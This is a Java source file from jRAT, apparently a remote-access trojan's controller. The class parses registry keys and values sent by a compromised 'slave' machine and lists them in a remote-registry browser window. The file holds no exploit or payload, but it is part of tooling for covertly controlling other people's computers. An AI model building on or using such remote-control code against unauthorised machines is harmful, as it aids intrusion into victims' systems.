package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import javax.swing.ImageIcon;

import se.jrat.client.Slave;
import se.jrat.client.ui.frames.FrameRemoteRegistry;


public class Packet54Registry extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int count = slave.readInt();
		String[] args = new String[count];
		for (int i = 0; i < count; i++) {
			args[i] = slave.readLine();
		}

		if (args[0].length() == 0) {
			return;
		}

		FrameRemoteRegistry frame = FrameRemoteRegistry.instances.get(slave);

		if (frame != null) {
			if (args.length == 3) {
				ImageIcon icon;
				if (args[1].equalsIgnoreCase("REG_SZ")) {
					icon = FrameRemoteRegistry.regsz;
				} else {
					icon = FrameRemoteRegistry.reg01;
				}

				frame.getRenderer().icons.put(args[0], icon);
				frame.getModel().addRow(new Object[] { args[0], args[2], args[1] });
			} else {
				int toInsert = 0;
				if (frame.getModel().getRowCount() > 0) {
					for (int i = 0; i < frame.getModel().getRowCount(); i++) {
						if (frame.getModel().getValueAt(i, 0).toString().toLowerCase().contains("folder")) {
							toInsert = i;
						} else {
							break;
						}
					}
				}
				frame.getRenderer().icons.put(args[0], FrameRemoteRegistry.folder);
				frame.getModel().insertRow(toInsert, new Object[] { args[0] });
			}
		}

	}

}
